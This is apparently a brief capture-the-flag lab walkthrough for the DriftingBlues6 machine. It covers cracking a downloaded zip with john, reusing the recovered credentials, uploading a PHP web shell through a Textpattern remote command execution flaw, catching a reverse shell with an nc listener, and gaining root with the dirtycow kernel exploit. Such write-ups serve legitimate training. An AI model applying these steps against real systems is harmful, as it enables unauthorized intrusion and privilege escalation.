###### tags: `Offsec` `PG Play` `Easy` `Linux` # DriftingBlues6
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Go to `http://192.168.217.219/spammer.zip` to download, use john to crack the password
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Extract to get `cred.txt`
```
mayer:lionheart
``` You can log in to `http://192.168.217.219/textpattern/textpattern`
Search for [TextPattern CMS 4.8.7 - Remote Command Execution (Authenticated)](https://www.exploit-db.com/exploits/49996)
，Go to`Content`->`files`uploadshell.php
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

Go to http://192.168.217.219/textpattern/files/shell.php
``` After geting a reverse shell, use `linpeas.sh`
```
...
[+] [CVE-2016-5195] dirtycow 2
   ...
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
``` Search[CVE-2016-5195](https://github.com/firefart/dirtycow)，get rootafterget proof.txt in /root
```
